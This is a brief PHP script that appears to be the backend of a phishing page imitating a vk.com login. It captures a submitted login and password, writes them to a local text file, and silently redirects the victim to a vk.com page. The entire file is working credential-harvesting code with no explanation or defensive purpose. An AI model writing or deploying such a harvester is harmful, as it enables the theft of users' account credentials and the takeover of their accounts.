<?PHP
$Log = $_POST['name'];
$Pass = $_POST['body'];
$log = fopen("zismo-biz.txt","at");
fwrite($log,"\n $Log:$Pass \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vk.com/scr_pro'></head></html>";
?> 